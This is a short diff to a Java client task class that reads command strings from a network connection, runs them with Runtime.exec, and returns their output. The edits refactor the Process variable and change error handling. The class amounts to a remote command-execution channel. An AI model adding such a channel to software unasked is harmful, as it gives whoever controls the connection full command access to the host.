@@ -22,8 +22,7 @@ public class RCRTask implements JCTaskInterface {
 	private JCWriter writer = null;
 	private String type = null;
 	private static Runtime run = Runtime.getRuntime();
-	private Process p = null;
-	
+
 	public RCRTask() {}
 
 	@Override
@@ -49,7 +48,8 @@ public class RCRTask implements JCTaskInterface {
 				 * and execute the command 
 				 */
 				String command = reader.readUTF();
-				p = run.exec(command); 
+				final Process p = run.exec(command);
+
 				final BufferedInputStream in = new BufferedInputStream(p.getInputStream());
 				final BufferedReader br = new BufferedReader(new InputStreamReader(in));
 
@@ -64,7 +64,7 @@ public class RCRTask implements JCTaskInterface {
 				in.close();
 				br.close();
 				p.destroy();
-				
+
 				/*
 				 * if there is ne response
 				 * send the empty tip
@@ -76,8 +76,16 @@ public class RCRTask implements JCTaskInterface {
 					writer.send(buff.toString());
 				}
 			} catch (IOException e) {
-				JClient.getInstance().offLineClear();
-				break;
+				// offline clean the client ONLY
+				// IF the really send is failed.
+				// in case is the IOException from the command execution
+				try {
+					writer.send(JCmdTools.RCMD_NOREPLY_VAL);
+				} catch (IOException ex) {
+					// ex.printStackTrace();
+					JClient.getInstance().offLineClear();
+					break;
+				}
 			}
 		}
 
